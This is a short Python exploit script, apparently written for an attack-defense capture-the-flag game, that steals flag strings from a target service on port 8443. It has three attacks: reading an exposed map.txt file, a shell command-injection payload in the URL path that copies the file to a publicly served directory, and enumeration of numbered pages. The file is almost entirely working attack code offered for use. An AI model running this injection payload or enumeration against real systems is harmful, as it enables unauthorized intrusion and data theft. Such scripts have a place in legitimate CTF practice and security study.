#!/usr/bin/env python3

import random
import re
import string
import sys
import os.path
import requests


team_addr = sys.argv[1]
PORT = 8443


def generate_rand(N=16):
    return ''.join(random.choice(string.ascii_letters) for i in range(N))


def exploit_one():
    s = requests.Session()
    r = s.get("http://{}:{}/map.txt".format(team_addr, PORT), verify=False)
    for flag in set(re.findall(r'([a-zA-Z0-9]{31}\=)', r.text)):
        print(flag, flush=True)


def exploit_two():
    s = requests.Session()
    rnd = generate_rand(random.randint(5, 16))
    r = s.get("http://{}:{}/0/aaa';cat%20map.txt>countries%2F{}.txt;echo%20'".format(team_addr, PORT, rnd), verify=False)
    r = s.get("http://{}:{}/countries/{}.txt".format(team_addr, PORT, rnd), verify=False)
    for flag in set(re.findall(r'([a-zA-Z0-9]{31}\=)', r.text)):
        print(flag, flush=True)


def exploit_three():
    s = requests.Session()
    for i in range(1, 300):
        r = s.get("http://{}:{}/{}".format(team_addr, PORT, i), verify=False)
        results = set(re.findall(r'([a-zA-Z0-9]{31}\=)', r.text))
        if "playing cities" not in r.text:
            break
        for flag in results:
            print(flag, flush=True)


import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

exploit_one()
exploit_two()
exploit_three()
